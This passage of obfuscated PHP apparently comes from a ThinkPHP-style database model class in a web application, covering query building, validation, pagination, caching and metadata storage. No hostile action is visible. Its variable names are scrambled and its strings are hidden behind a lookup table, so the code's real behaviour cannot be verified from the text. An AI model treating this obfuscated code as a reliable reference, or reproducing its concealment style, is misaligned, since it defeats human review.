$ş¼ô†å[0]); } if (is_array($ş¼ô†å[0])) { foreach ($ş¼ô†å[0] as $ŞÎ¯àÙ) { $ÎİÜ[$ŞÎ¯àÙ] = $ÌÇŠˆ„ñ[$ŞÎ¯àÙ]; } array_unshift($—ÄÇ½Û©, $ÎİÜ); } else { array_unshift($—ÄÇ½Û©, $ÌÇŠˆ„ñ[$ş¼ô†å[0]]); } if ($Ì›´ÀÖ’[390] == $ş¼ô†å[4]) { return call_user_func_array($ş¼ô†å[1], $—ÄÇ½Û©); } else { return call_user_func_array(array(&$this, $ş¼ô†å[1]), $—ÄÇ½Û©); } case $Ì›´ÀÖ’[398]: return $ÌÇŠˆ„ñ[$ş¼ô†å[0]] == $ÌÇŠˆ„ñ[$ş¼ô†å[1]]; case $Ì›´ÀÖ’[399]: if (is_string($ş¼ô†å[0]) && strpos($ş¼ô†å[0], $Ì›´ÀÖ’[50])) { $ş¼ô†å[0] = explode($Ì›´ÀÖ’[50], $ş¼ô†å[0]); } $ëËª²ª¼ = array(); if (is_array($ş¼ô†å[0])) { foreach ($ş¼ô†å[0] as $ŞÎ¯àÙ) { $ëËª²ª¼[$ŞÎ¯àÙ] = $ÌÇŠˆ„ñ[$ŞÎ¯àÙ]; } } else { $ëËª²ª¼[$ş¼ô†å[0]] = $ÌÇŠˆ„ñ[$ş¼ô†å[0]]; } if (!empty($ÌÇŠˆ„ñ[$this->getPk()])) { $ëËª²ª¼[$this->getPk()] = array($Ì›´ÀÖ’[400], $ÌÇŠˆ„ñ[$this->getPk()]); } if ($this->where($ëËª²ª¼)->find()) { return !1; } return !0; default: return $this->check($ÌÇŠˆ„ñ[$ş¼ô†å[0]], $ş¼ô†å[1], $ş¼ô†å[4]); } } public function check($İ–Œîİ‡, $¥õºÕ¿ô, $üú±é® = "\x72\x65\147\x65\170") { $Ğ€Ò€øö =& $_SERVER[è¶³ÒßÑ]; $üú±é® = strtolower(trim($üú±é®)); switch ($üú±é®) { case $Ğ€Ò€øö[7]: case $Ğ€Ò€øö[401]: $·ì‚˜İÛ = is_array($¥õºÕ¿ô) ? $¥õºÕ¿ô : explode($Ğ€Ò€øö[50], $¥õºÕ¿ô); return $üú±é® == $Ğ€Ò€øö[7] ? in_array($İ–Œîİ‡, $·ì‚˜İÛ) : !in_array($İ–Œîİ‡, $·ì‚˜İÛ); case $Ğ€Ò€øö[402]: case $Ğ€Ò€øö[403]: if (is_array($¥õºÕ¿ô)) { $ŞúÙº˜ = $¥õºÕ¿ô[0]; $à²¥ı¯Ñ = $¥õºÕ¿ô[1]; } else { list($ŞúÙº˜, $à²¥ı¯Ñ) = explode($Ğ€Ò€øö[50], $¥õºÕ¿ô); } return $üú±é® == $Ğ€Ò€øö[402] ? $İ–Œîİ‡ >= $ŞúÙº˜ && $İ–Œîİ‡ <= $à²¥ı¯Ñ : $İ–Œîİ‡ < $ŞúÙº˜ || $İ–Œîİ‡ > $à²¥ı¯Ñ; case $Ğ€Ò€øö[404]: case $Ğ€Ò€øö[405]: return $üú±é® == $Ğ€Ò€øö[404] ? $İ–Œîİ‡ == $¥õºÕ¿ô : $İ–Œîİ‡ != $¥õºÕ¿ô; case $Ğ€Ò€øö[406]: $Ê¹úËèÇ = mb_strlen($İ–Œîİ‡, $Ğ€Ò€øö[407]); if (strpos($¥õºÕ¿ô, $Ğ€Ò€øö[50])) { list($ŞúÙº˜, $à²¥ı¯Ñ) = explode($Ğ€Ò€øö[50], $¥õºÕ¿ô); return $Ê¹úËèÇ >= $ŞúÙº˜ && $Ê¹úËèÇ <= $à²¥ı¯Ñ; } else { return $Ê¹úËèÇ == $¥õºÕ¿ô; } case $Ğ€Ò€øö[408]: list($­©‹ü¡×, $ùºŸ) = explode($Ğ€Ò€øö[50], $¥õºÕ¿ô); if (!is_numeric($­©‹ü¡×)) { $­©‹ü¡× = strtotime($­©‹ü¡×); } if (!is_numeric($ùºŸ)) { $ùºŸ = strtotime($ùºŸ); } return NOW_TIME >= $­©‹ü¡× && NOW_TIME <= $ùºŸ; case $Ğ€Ò€øö[409]: return in_array(get_client_ip(), explode($Ğ€Ò€øö[50], $¥õºÕ¿ô)); case $Ğ€Ò€øö[410]: return !in_array(get_client_ip(), explode($Ğ€Ò€øö[50], $¥õºÕ¿ô)); case $Ğ€Ò€øö[397]: default: return $this->regex($İ–Œîİ‡, $¥õºÕ¿ô); } } public function query($ğõıŒ¤å, $ƒÌÍÙØ = false) { $œü¨à» =& $_SERVER[è¶³ÒßÑ]; if (!is_bool($ƒÌÍÙØ) && !is_array($ƒÌÍÙØ)) { $ƒÌÍÙØ = func_get_args(); array_shift($ƒÌÍÙØ); } $ğõıŒ¤å = str_replace(array($œü¨à»[60], $œü¨à»[411]), $œü¨à»[53], $ğõıŒ¤å); $ğõıŒ¤å = $this->parseSql($ğõıŒ¤å, $ƒÌÍÙØ); return $this->db->query($ğõıŒ¤å); } public function execute($Ğ×â¤—Û, $¸À«Üµ = false) { if (!is_bool($¸À«Üµ) && !is_array($¸À«Üµ)) { $¸À«Üµ = func_get_args(); array_shift($¸À«Üµ); } $Ğ×â¤—Û = $this->parseSql($Ğ×â¤—Û, $¸À«Üµ); return $this->db->execute($Ğ×â¤—Û); } protected function parseSql($¤Â™åò¥, $–ñŠ¯ÛÙ) { $Î†’Æ…™ =& $_SERVER[è¶³ÒßÑ]; if (!0 === $–ñŠ¯ÛÙ) { $ÅŒ‚Õ¾­ = $this->_parseOptions(); $¤Â™åò¥ = $this->db->parseSql($¤Â™åò¥, $ÅŒ‚Õ¾­); } elseif (is_array($–ñŠ¯ÛÙ)) { $–ñŠ¯ÛÙ = array_map(array($this->db, $Î†’Æ…™[412]), $–ñŠ¯ÛÙ); $¤Â™åò¥ = vsprintf($¤Â™åò¥, $–ñŠ¯ÛÙ); } else { $¤Â™åò¥ = strtr($¤Â™åò¥, array($Î†’Æ…™[413] => $this->getTableName(), $Î†’Æ…™[414] => think_config($Î†’Æ…™[314]))); } $this->db->setModel($this->name); return $¤Â™åò¥; } public function db($— ¬€Ä‡ = '', $êæÔö = '', $ı­÷ÓÑ© = array()) { $‡Ş‡Òë€ =& $_SERVER[è¶³ÒßÑ]; if ($‡Ş‡Òë€[12] === $— ¬€Ä‡ && $this->db) { return $this->db; } static $†¯Ï … = array(); static $–¹†Ç­ï = array(); if (!isset($–¹†Ç­ï[$— ¬€Ä‡]) || isset($–¹†Ç­ï[$— ¬€Ä‡]) && $êæÔö && $†¯Ï …[$— ¬€Ä‡] != $êæÔö) { if (!empty($êæÔö) && is_string($êæÔö) && !1 === strpos($êæÔö, $‡Ş‡Òë€[8])) { $êæÔö = think_config($êæÔö); } $— ¬€Ä‡ = think_guid($êæÔö); $–¹†Ç­ï[$— ¬€Ä‡] = Db::getInstance($êæÔö); } elseif (NULL === $êæÔö) { $–¹†Ç­ï[$— ¬€Ä‡]->close(); unset($–¹†Ç­ï[$— ¬€Ä‡]); return; } if (!empty($ı­÷ÓÑ©)) { if (is_string($ı­÷ÓÑ©)) { parse_str($ı­÷ÓÑ©, $ı­÷ÓÑ©); } foreach ($ı­÷ÓÑ© as $Ñï¢•Óª => $ÕÃÎôüû) { $this->setProperty($Ñï¢•Óª, $ÕÃÎôüû); } } $†¯Ï …[$— ¬€Ä‡] = $êæÔö; $this->db = $–¹†Ç­ï[$— ¬€Ä‡]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ôÒÕâØ‚ = get_class($this); if ($ôÒÕâØ‚ == $_SERVER[è¶³ÒßÑ][415]) { return $this->name; } $this->name = substr($ôÒÕâØ‚, 0, -5); } return $this->name; } public function getTableName() { $³ôœÅş =& $_SERVER[è¶³ÒßÑ]; if (empty($this->trueTableName)) { $¢¿ÆïğÑ = !empty($this->tablePrefix) ? $this->tablePrefix : $³ôœÅş[12]; if (!empty($this->tableName)) { $¢¿ÆïğÑ .= $this->tableName; } else { $¢¿ÆïğÑ .= think_parse_name($this->name); } $this->trueTableName = strtolower($¢¿ÆïğÑ); } return (!empty($this->dbName) ? $this->dbName . $³ôœÅş[10] : $³ôœÅş[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÙÊ¥Ïğ =& $_SERVER[è¶³ÒßÑ]; return isset($this->fields[$ÙÊ¥Ïğ[321]]) ? $this->fields[$ÙÊ¥Ïğ[321]] : $this->pk; } public function getDbFields() { $î£åŠş¿ =& $_SERVER[è¶³ÒßÑ]; if (isset($this->options[$î£åŠş¿[349]])) { $„ŒâÀßŠ = $this->db->getFields($this->options[$î£åŠş¿[349]]); return $„ŒâÀßŠ ? array_keys($„ŒâÀßŠ) : !1; } if ($this->fields) { $„ŒâÀßŠ = $this->fields; unset($„ŒâÀßŠ[$î£åŠş¿[320]], $„ŒâÀßŠ[$î£åŠş¿[321]], $„ŒâÀßŠ[$î£åŠş¿[322]], $„ŒâÀßŠ[$î£åŠş¿[319]]); return $„ŒâÀßŠ; } return !1; } public function data($œåş ï§ = '') { $ùï”Îñê =& $_SERVER[è¶³ÒßÑ]; if ($ùï”Îñê[12] === $œåş ï§ && !empty($this->data)) { return $this->data; } if (is_object($œåş ï§)) { $œåş ï§ = get_object_vars($œåş ï§); } elseif (is_string($œåş ï§)) { parse_str($œåş ï§, $œåş ï§); } elseif (!is_array($œåş ï§)) { think_exception(think_lang($ùï”Îñê[341])); } $this->data = $œåş ï§; return $this; } public function join($ÃÏœïì­) { $Ã«ıÓÕ =& $_SERVER[è¶³ÒßÑ]; if (is_array($ÃÏœïì­)) { $this->options[$Ã«ıÓÕ[352]] = $ÃÏœïì­; } elseif (!empty($ÃÏœïì­)) { $this->options[$Ã«ıÓÕ[352]][] = $ÃÏœïì­; } return $this; } public function union($¥íÃõ¤ , $áàÓ–ì¶ = false) { $Ò¡Â¶“³ =& $_SERVER[è¶³ÒßÑ]; if (empty($¥íÃõ¤ )) { return $this; } if ($áàÓ–ì¶) { $this->options[$Ò¡Â¶“³[416]][$Ò¡Â¶“³[417]] = !0; } if (is_object($¥íÃõ¤ )) { $¥íÃõ¤  = get_object_vars($¥íÃõ¤ ); } if (is_string($¥íÃõ¤ )) { $Í„×í…Ò = $¥íÃõ¤ ; } elseif (is_array($¥íÃõ¤ )) { if (isset($¥íÃõ¤ [0])) { $this->options[$Ò¡Â¶“³[416]] = array_merge($this->options[$Ò¡Â¶“³[416]], $¥íÃõ¤ ); return $this; } else { $Í„×í…Ò = $¥íÃõ¤ ; } } else { think_exception(think_lang($Ò¡Â¶“³[341])); } $this->options[$Ò¡Â¶“³[416]][] = $Í„×í…Ò; return $this; } public function cache($–©”„–¢ = true, $ÕÔ¥ÛÅ¾ = null, $áÖ¤£Øğ = '') { $ñôù¸º =& $_SERVER[è¶³ÒßÑ]; if (!1 !== $–©”„–¢) { $this->options[$ñôù¸º[418]] = array($ñôù¸º[107] => $–©”„–¢, $ñôù¸º[408] => $ÕÔ¥ÛÅ¾, $ñôù¸º[33] => $áÖ¤£Øğ); } return $this; } public function field($–Ú³…‰ª, $ç¡·×í¸ = false) { $†Šó¥Éô =& $_SERVER[è¶³ÒßÑ]; if (!0 === $–Ú³…‰ª) { $Ù”²¯ô = $this->getDbFields(); $–Ú³…‰ª = $Ù”²¯ô ? $Ù”²¯ô : $†Šó¥Éô[230]; } elseif ($ç¡·×í¸) { if (is_string($–Ú³…‰ª)) { $–Ú³…‰ª = explode($†Šó¥Éô[50], $–Ú³…‰ª); } $Ù”²¯ô = $this->getDbFields(); $–Ú³…‰ª = $Ù”²¯ô ? array_diff($Ù”²¯ô, $–Ú³…‰ª) : $–Ú³…‰ª; } $this->options[$†Šó¥Éô[343]] = $–Ú³…‰ª; return $this; } public function scope($ãò²ÇÖò = '', $•ÄÔ­±ß = NULL) { $Øñ­Æ÷Ë =& $_SERVER[è¶³ÒßÑ]; if ($Øñ­Æ÷Ë[12] === $ãò²ÇÖò) { if (isset($this->_scope[$Øñ­Æ÷Ë[37]])) { $œª‡˜¬ = $this->_scope[$Øñ­Æ÷Ë[37]]; } else { return $this; } } elseif (is_string($ãò²ÇÖò)) { $“¼ßëÀ¬ = explode($Øñ­Æ÷Ë[50], $ãò²ÇÖò); $œª‡˜¬ = array(); foreach ($“¼ßëÀ¬ as $Ó‚öñÒÜ) { if (!isset($this->_scope[$Ó‚öñÒÜ])) { continue; } $œª‡˜¬ = array_merge($œª‡˜¬, $this->_scope[$Ó‚öñÒÜ]); } if (!empty($•ÄÔ­±ß) && is_array($•ÄÔ­±ß)) { $œª‡˜¬ = array_merge($œª‡˜¬, $•ÄÔ­±ß); } } elseif (is_array($ãò²ÇÖò)) { $œª‡˜¬ = $ãò²ÇÖò; } if (is_array($œª‡˜¬) && !empty($œª‡˜¬)) { $this->options = array_merge($this->options, array_change_key_case($œª‡˜¬)); } return $this; } public function where($üşù³êı, $ùÁ¿¤êò = null) { $ïÈ…úæÛ =& $_SERVER[è¶³ÒßÑ]; if (!is_null($ùÁ¿¤êò) && is_string($üşù³êı)) { if (!is_array($ùÁ¿¤êò)) { $ùÁ¿¤êò = func_get_args(); array_shift($ùÁ¿¤êò); } $ùÁ¿¤êò = array_map(array($this->db, $ïÈ…úæÛ[412]), $ùÁ¿¤êò); $üşù³êı = vsprintf($üşù³êı, $ùÁ¿¤êò); } elseif (is_object($üşù³êı)) { $üşù³êı = get_object_vars($üşù³êı); } elseif (is_array($üşù³êı)) { foreach ($üşù³êı as $Ò†Å„½ => $‚ş§Òóå) { if ((is_numeric($Ò†Å„½) || !$Ò†Å„½) && is_string($‚ş§Òóå)) { if (strpos($‚ş§Òóå, $ïÈ…úæÛ[419]) === 0) { continue; } think_trace($ïÈ…úæÛ[420], $ïÈ…úæÛ[12], $ïÈ…úæÛ[49]); die; } } } if (is_string($üşù³êı) && $ïÈ…úæÛ[12] != $üşù³êı) { $¹ÕŒ = array(); $¹ÕŒ[$ïÈ…úæÛ[421]] = $üşù³êı; $üşù³êı = $¹ÕŒ; } if (isset($this->options[$ïÈ…úæÛ[345]])) { $this->options[$ïÈ…úæÛ[345]] = array_merge($this->options[$ïÈ…úæÛ[345]], $üşù³êı); } else { $this->options[$ïÈ…úæÛ[345]] = $üşù³êı; } return $this; } public function limit($¨¡ßˆ‰ƒ, $õßåˆ×Ô = null) { $«ÏûÂ¾Ã =& $_SERVER[è¶³ÒßÑ]; $this->options[$«ÏûÂ¾Ã[361]] = is_null($õßåˆ×Ô) ? $¨¡ßˆ‰ƒ : $¨¡ßˆ‰ƒ . $«ÏûÂ¾Ã[50] . $õßåˆ×Ô; return $this; } public function page($õùîË , $­¨­âè£ = null) { $‡İ­Ô™ =& $_SERVER[è¶³ÒßÑ]; $this->options[$‡İ­Ô™[422]] = is_null($­¨­âè£) ? $õùîË  : $õùîË  . $‡İ­Ô™[50] . $­¨­âè£; return $this; } public function comment($Æ‰µ•ó€) { $this->options[$_SERVER[è¶³ÒßÑ][423]] = $Æ‰µ•ó€; return $this; } public function setProperty($¿«Èî±ô, $åÛŸ”øÌ) { if (property_exists($this, $¿«Èî±ô)) { $this->{$¿«Èî±ô} = $åÛŸ”øÌ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\124\151\155\x65", "\x74\x69\155\x65", "\x69\156\x73\145\162\x74\54\165\160\144\141\x74\145", "\x66\165\x6e\x63\x74\151\157\x6e"), array("\x63\162\x65\141\164\x65\124\x69\155\145", "\164\151\x6d\x65", "\151\x6e\x73\x65\162\x74", "\x66\x75\156\x63\x74\151\x6f\x6e")); public function setDataAuto($µÍ¯Š÷) { $this->dataAuto = $µÍ¯Š÷; } public function __construct($ïµİÁï = '', $¸ƒôŠè† = '', $Ä‘¿Â¨› = '') { parent::__construct($ïµİÁï, $¸ƒôŠè†, $Ä‘¿Â¨›); } protected $tableMeta = array(); protected function _beforeInsert(&$‚é¿ç™§, $û£Å”ïÆ) { $£úÏ‡æË =& $_SERVER[è¶³ÒßÑ]; if (!$this->checkDataAutoHas($£úÏ‡æË[424])) { return; } $this->dataBeforeFilter($‚é¿ç™§, $£úÏ‡æË[424]); } protected function _beforeUpdate(&$ÚÊÄ€’, $áëı¢åë) { $÷Ë£ƒ³ =& $_SERVER[è¶³ÒßÑ]; if (!$this->checkDataAutoHas($÷Ë£ƒ³[425])) { return; } $this->dataBeforeFilter($ÚÊÄ€’, $÷Ë£ƒ³[425]); } protected function _afterSelect(&$éÃÒà¦, $ĞŠ„„ƒ€) { if (!is_array($éÃÒà¦)) { return; } if (!$this->checkDataAutoHas($_SERVER[è¶³ÒßÑ][426])) { return; } foreach ($éÃÒà¦ as &$‘¡Êºáª) { $this->dataAfterFilter($‘¡Êºáª); } unset($‘¡Êºáª); } protected function _afterFind(&$Ü®ƒ³›, $Ÿ­¨ÀÁÀ) { if (!is_array($Ü®ƒ³›)) { return; } if (!$this->checkDataAutoHas($_SERVER[è¶³ÒßÑ][426])) { return; } $this->dataAfterFilter($Ü®ƒ³›); } public static function textEncode($—ƒôÆÖ) { if (!$—ƒôÆÖ) { return $—ƒôÆÖ; } $ßåÚ®Ëˆ = json_encode($—ƒôÆÖ); $ßåÚ®Ëˆ = preg_replace_callback($_SERVER[è¶³ÒßÑ][427], function ($‘¿ó¶ïà) { return addslashes($‘¿ó¶ïà[0]); }, $ßåÚ®Ëˆ); return json_decode($ßåÚ®Ëˆ); } public static function textDecode($òÛî“ïÀ) { $Í¸âÊ…Ú =& $_SERVER[è¶³ÒßÑ]; $ŒÛ¡¨˜õ = json_encode($òÛî“ïÀ); $ŒÛ¡¨˜õ = preg_replace_callback($Í¸âÊ…Ú[428], function ($Õššã€ú) { return $_SERVER[è¶³ÒßÑ][110]; }, $ŒÛ¡¨˜õ); return json_decode($ŒÛ¡¨˜õ); } public function setAutoIncrement($ÕªÜè…è) { $Ú¬ìŠÊÓ = array($this->getPk() => $ÕªÜè…è); $‹Ã”‰İÏ = $this->data($Ú¬ìŠÊÓ)->add(); if ($‹Ã”‰İÏ) { $this->delete($‹Ã”‰İÏ); } } public function getAutoIncrement() { $ş®åÒìá = $this->getTableName(); $ŒÁí¸ˆş = $this->max($this->getPk()); $ªòó”®ê = $this->query("\163\x68\157\x77\x20\x74\141\x62\154\145\x20\x73\x74\141\164\165\x73\x20\167\x68\145\162\x65\40\x4e\x61\x6d\145\x3d\x27{$ş®åÒìá}\47"); $ƒÏ–¾•é = $ªòó”®ê[0][$_SERVER[è¶³ÒßÑ][429]]; $»¯¶ËŒÕ = max($ŒÁí¸ˆş, $ƒÏ–¾•é); return $»¯¶ËŒÕ; } protected function _callBefore($³›¯Ì†­, $¥‚æ¦) { return $this->cacheCallCheck($³›¯Ì†­, $¥‚æ¦, !1); } protected function _callAfter($ø¿‚Û¿ç, $ÅÃÜËÍú) { return $this->cacheCallCheck($ø¿‚Û¿ç, $ÅÃÜËÍú, !0); } protected function cacheFunctionAlias($Ç©¨ÆÄÕ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($‹‹ÇòÅ¢, $¯û£ÊŸ», $´æ­–éˆ = false) { $øÉ—‘÷‚ = $this->cacheFunctionAlias($¯û£ÊŸ»); if (!$øÉ—‘÷‚) { return; } foreach ($øÉ—‘÷‚ as $™¢Üƒ´¥ => $˜”‰„) { $¢åàı = $˜”‰„[0]; $·ÇÖÇ«Á = explode($_SERVER[è¶³ÒßÑ][50], $˜”‰„[1]); if ($‹‹ÇòÅ¢ == $™¢Üƒ´¥) { return $this->cacheFunctionGet($™¢Üƒ´¥, $¢åàı); } if ($´æ­–éˆ && in_array($‹‹ÇòÅ¢, $·ÇÖÇ«Á)) { $this->cacheFunctionClear($™¢Üƒ´¥, $¢åàı); } } } public function cacheFunctionGet($ÎÓĞÜ±Ş, $Ó­È¦é•) { $­ÄèçèÃ = $this->cacheKeyMake($ÎÓĞÜ±Ş, $Ó­È¦é•); $±Á€íå‰ = Cache::get($­ÄèçèÃ); if (!is_array($±Á€íå‰)) { $±Á€íå‰ = call_user_func_array(array($this, $ÎÓĞÜ±Ş), array($Ó­È¦é•, !0)); Cache::set($­ÄèçèÃ, $±Á€íå‰); } return $±Á€íå‰; } public function cacheFunctionClear($‘ßÌ«•İ, $¥„øºÅí) { $¹şûŸ‘° = $¥„øºÅí; if (!is_array($¥„øºÅí)) { $¹şûŸ‘° = array($¥„øºÅí); } foreach ($¹şûŸ‘° as $İ«í‚¾‰) { $­´˜Ğ‰Ú = $this->cacheKeyMake($‘ßÌ«•İ, $İ«í‚¾‰); Cache::remove($­´˜Ğ‰Ú); } } private function cacheKeyMake($ÈĞ÷ÊÖˆ, $‘×œĞ³) { $ú×‘÷Ü =& $_SERVER[è¶³ÒßÑ]; return get_class($this) . $ú×‘÷Ü[11] . $ÈĞ÷ÊÖˆ . $ú×‘÷Ü[430] . $‘×œĞ³; } protected function selectPageReset() { $í°ˆ¬åš =& $_SERVER[è¶³ÒßÑ]; if (isset($GLOBALS[$í°ˆ¬åš[431]])) { return; } $GLOBALS[$í°ˆ¬åš[431]] = isset($GLOBALS[$í°ˆ¬åš[7]][$í°ˆ¬åš[432]]) ? $GLOBALS[$í°ˆ¬åš[7]][$í°ˆ¬åš[432]] : !1; $GLOBALS[$í°ˆ¬åš[433]] = isset($GLOBALS[$í°ˆ¬åš[7]][$í°ˆ¬åš[422]]) ? $GLOBALS[$í°ˆ¬åš[7]][$í°ˆ¬åš[422]] : !1; $GLOBALS[$í°ˆ¬åš[7]][$í°ˆ¬åš[432]] = !1; $GLOBALS[$í°ˆ¬åš[7]][$í°ˆ¬åš[422]] = !1; } protected function selectPageRestore() { $ñõŒ ª® =& $_SERVER[è¶³ÒßÑ]; if (!isset($GLOBALS[$ñõŒ ª®[431]])) { return; } $GLOBALS[$ñõŒ ª®[7]][$ñõŒ ª®[432]] = $GLOBALS[$ñõŒ ª®[431]]; $GLOBALS[$ñõŒ ª®[7]][$ñõŒ ª®[422]] = $GLOBALS[$ñõŒ ª®[433]]; if ($GLOBALS[$ñõŒ ª®[7]][$ñõŒ ª®[432]] === !1) { unset($GLOBALS[$ñõŒ ª®[7]][$ñõŒ ª®[432]]); } if ($GLOBALS[$ñõŒ ª®[7]][$ñõŒ ª®[422]] === !1) { unset($GLOBALS[$ñõŒ ª®[7]][$ñõŒ ª®[422]]); } unset($GLOBALS[$ñõŒ ª®[431]]); unset($GLOBALS[$ñõŒ ª®[433]]); } protected function selectPage($àÈâÖÊª = 200, $è˜·¸â´ = 1) { $³ü²ÂˆÈ =& $_SERVER[è¶³ÒßÑ]; global $in; $Ôğº¼ãØ = $this->optionsValue(); $½ûÂÑĞµ = 50000; $àÈâÖÊª = isset($in[$³ü²ÂˆÈ[432]]) && $in[$³ü²ÂˆÈ[432]] ? $in[$³ü²ÂˆÈ[432]] : $àÈâÖÊª; if ($àÈâÖÊª === -1) { $in[$³ü²ÂˆÈ[432]] = !1; $½ûÂÑĞµ = 100000000; $àÈâÖÊª = $½ûÂÑĞµ; } $ä½£Âñ = $Ôğº¼ãØ; $ä½£Âñ[$³ü²ÂˆÈ[434]] = array(); $àÈâÖÊª = intval($àÈâÖÊª); $àÈâÖÊª = $àÈâÖÊª <= 5 ? 5 : ($àÈâÖÊª >= $½ûÂÑĞµ ? $½ûÂÑĞµ : $àÈâÖÊª); $è˜·¸â´ = intval(isset($in[$³ü²ÂˆÈ[422]]) && $in[$³ü²ÂˆÈ[422]] ? $in[$³ü²ÂˆÈ[422]] : $è˜·¸â´); $è˜·¸â´ = $è˜·¸â´ <= 1 ? 1 : $è˜·¸â´; $«»°ùˆ§ = array(); $ş¨ş¦’Û = 1; if ($è˜·¸â´ == 1 && $ş¨ş¦’Û) { $this->optionsValue($Ôğº¼ãØ); $«»°ùˆ§ = $this->page($è˜·¸â´, $àÈâÖÊª)->select(); $‹„ç¯Š€ = is_array($«»°ùˆ§) ? count($«»°ùˆ§) : 0; if ($‹„ç¯Š€ < $àÈâÖÊª) { $·©Ü±ø = 1; } else { $this->optionsValue($ä½£Âñ); $‹„ç¯Š€ = intval($this->count()); $·©Ü±ø = ceil($‹„ç¯Š€ / $àÈâÖÊª); } } else { $this->optionsValue($ä½£Âñ); $‹„ç¯Š€ = intval($this->count()); $·©Ü±ø = ceil($‹„ç¯Š€ / $àÈâÖÊª); $è˜·¸â´ = $è˜·¸â´ >= $·©Ü±ø ? $·©Ü±ø : $è˜·¸â´; $this->optionsValue($Ôğº¼ãØ); $«»°ùˆ§ = $this->page($è˜·¸â´, $àÈâÖÊª)->select(); } if (!is_array($«»°ùˆ§)) { $«»°ùˆ§ = array(); } if ($·©Ü±ø == 1) { $‹„ç¯Š€ = count($«»°ùˆ§); } $ÚÑÌ…Áî = array($³ü²ÂˆÈ[435] => array($³ü²ÂˆÈ[436] => $‹„ç¯Š€, $³ü²ÂˆÈ[432] => $àÈâÖÊª, $³ü²ÂˆÈ[422] => $è˜·¸â´, $³ü²ÂˆÈ[437] => $·©Ü±ø), $³ü²ÂˆÈ[438] => $«»°ùˆ§); return $ÚÑÌ…Áî; } protected function checkLength($÷àÖŸäù, $­ÑıÙ… = 0, $é¥ş„‰î = '') { $ƒ¡ÚÒñÏ =& $_SERVER[è¶³ÒßÑ]; $­ÑıÙ… = $­ÑıÙ… ? $­ÑıÙ… : 65536; if (!$÷àÖŸäù || strlen($÷àÖŸäù) < $­ÑıÙ…) { return; } $é¥ş„‰î = $é¥ş„‰î ? $é¥ş„‰î . $ƒ¡ÚÒñÏ[84] : $ƒ¡ÚÒñÏ[12]; show_json($é¥ş„‰î . LNG($ƒ¡ÚÒñÏ[439]) . "\50{$­ÑıÙ…}\x29", !1); } protected function metaSet($òÙ¤Ğ†¾, $ÊÏª“ş° = null, $ğ•Ø™ã® = null) { $Üşš€„á =& $_SERVER[è¶³ÒßÑ]; if (!$this->tableMeta || !$òÙ¤Ğ†¾) { return !1; } $ÇÏç…’› = $this->tableMeta[$Üşš€„á[440]]; $ñÔêÔô = $this->tableMeta[$Üşš€„á[441]]; $³¼©ìÃÂ = Model($ñÔêÔô); $±Â¨”¨ò = array($ÇÏç…’› => $òÙ¤Ğ†¾, $Üşš€„á[442] => $ÊÏª“ş°); if (is_null($ÊÏª“ş°)) { return $³¼©ìÃÂ->where(array($ÇÏç…’› => $òÙ¤Ğ†¾))->delete(); } if (is_null($ğ•Ø™ã®) && is_string($ÊÏª“ş°)) { return $³¼©ìÃÂ->where($±Â¨”¨ò)->delete(); } $´¶¶™Ì = is_array($ÊÏª“ş°) ? $ÊÏª“ş° : array(); if (is_string($ÊÏª“ş°)) { $´¶¶™Ì[$ÊÏª“ş°] = $ğ•Ø™ã®; } $ÜÚªœ†Í = array(); foreach ($´¶¶™Ì as $¢Ô•Ê„Á => $ÉĞÛ²»ò) { if (is_null($ÉĞÛ²»ò) && is_string($¢Ô•Ê„Á)) { $³¼©ìÃÂ->where(array($ÇÏç…’› => $òÙ¤Ğ†¾, $Üşš€„á[442] => $¢Ô•Ê„Á))->delete(); continue; } $this->checkLength($ÉĞÛ²»ò, !1, $ñÔêÔô . $Üşš€„á[4] . $¢Ô•Ê„Á); $ÜÚªœ†Í[] = array($ÇÏç…’› => $òÙ¤Ğ†¾, $Üşš€„á[107] => $¢Ô•Ê„Á, $Üşš€„á[443] => $ÉĞÛ²»ò); } $ï…şÓıÖ = $Üşš€„á[444] . $ñÔêÔô; CacheLock::lock($ï…şÓıÖ); $³¼©ìÃÂ->where(array($ÇÏç…’› => $òÙ¤Ğ†¾))->addAll($ÜÚªœ†Í, array(), !0); CacheLock::unlock($ï…şÓıÖ); return !0; } public function metaGet($¾Æˆéé, $íƒÆ¬¦ß = false) { $™Ìûåò =& $_SERVER[è¶³ÒßÑ]; if (!$this->tableMeta) { return array(); } $ÒóÕíÇ¯ = $this->tableMeta[$™Ìûåò[440]]; $Ğ ­ÈüÛ = Model($this->tableMeta[$™Ìûåò[441]]); if ($íƒÆ¬¦ß) { $± Îà’Ç = array($ÒóÕíÇ¯ => $¾Æˆéé, $™Ìûåò[107] => $íƒÆ¬¦ß); return $Ğ ­ÈüÛ->where($± Îà’Ç)->getField($™Ìûåò[443]); } $± Îà’Ç = array($ÒóÕíÇ¯ => $¾Æˆéé); $®ÜÔØ¼‰ = $Ğ ­ÈüÛ->field($™Ìûåò[445])->where($± Îà’Ç)->select(); $®ÜÔØ¼‰ = array_to_keyvalue($®ÜÔØ¼‰, $™Ìûåò[107], $™Ìûåò[443]); return $®ÜÔØ¼‰; } private function checkDataAutoHas($Š•ƒÚâ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ä¯Ã¯ÔŸ) { if (in_array($Š•ƒÚâ, explode($_SERVER[è¶³ÒßÑ][50], $Ä¯Ã¯ÔŸ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$›Ã–ú¬, $—×ÛğÄè) { $Åó’¤¬ğ =& $_SERVER[è¶³ÒßÑ]; if (!is_array($›Ã–ú¬)) { return; } foreach ($this->dataAuto as $‚£Áø®›) { $•İ™²ë = $‚£Áø®›[0]; if (!in_array($—×ÛğÄè, explode($Åó’¤¬ğ[50], $‚£Áø®›[2]))) { continue; } switch (trim($‚£Áø®›[3])) { case $Åó’¤¬ğ[390]: case $Åó’¤¬ğ[391]: 